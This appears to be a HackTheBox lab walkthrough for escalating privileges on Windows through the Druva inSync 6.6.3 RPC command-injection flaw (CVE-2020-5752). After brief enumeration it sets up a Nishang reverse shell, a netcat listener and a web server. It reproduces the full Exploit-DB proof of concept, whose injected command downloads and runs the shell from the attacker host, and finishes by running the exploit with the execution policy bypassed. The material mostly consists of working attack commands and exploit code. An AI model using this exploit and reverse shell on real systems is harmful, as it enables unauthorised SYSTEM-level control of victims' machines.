# Vulnerable Services

## Installed Programs

```pwsh
PS C:\Users\htb-student> wmic PRODUCT GET Name
```

```output title="Output" hl_lines="6"
Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

## Port [6064](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/)

```pwsh
PS C:\Users\htb-student> netstat -ano | findstr /C:6064
```

```output title="Output"
TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3308
TCP    127.0.0.1:6064         127.0.0.1:58889        ESTABLISHED     3308
TCP    127.0.0.1:58889        127.0.0.1:6064         ESTABLISHED     3844
```

## Process

```pwsh
PS C:\Users\htb-student> Get-Process -Id 3308
```

```output title="Output"
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    143      10     1456       6448              3308   0 inSyncCPHwnet64
```

## [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

```sh
my@attack:~$ wget -q 'https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1'
my@attack:~$ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.164 -Port 9001' >> Invoke-PowerShellTcp.ps1
```

## Netcat

```sh
my@attack:~$ nc -lvnp 9001
```

## Web Server

```sh
my@attack:~$ python3 -m http.server 8888
```

## [POC](https://www.exploit-db.com/exploits/49211)

```powershell title="49211.ps1" linenums="1" hl_lines="15 22"
# Exploit Title: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)
# Date: 2020-12-03
# Exploit Author: 1F98D
# Original Author: Matteo Malvica
# Vendor Homepage: druva.com
# Software Link: https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi
# Version: 6.6.3
# Tested on: Windows 10 (x64)
# CVE: CVE-2020-5752
# References: https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/
# Druva inSync exposes an RPC service which is vulnerable to a command injection attack.

$ErrorActionPreference = "Stop"

$cmd = "powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.164:8888/Invoke-PowerShellTcp.ps1')"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

## Reverse Shell

```pwsh
PS C:\Users\htb-student> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process -Force
PS C:\Users\htb-student> .\49211.ps1
```
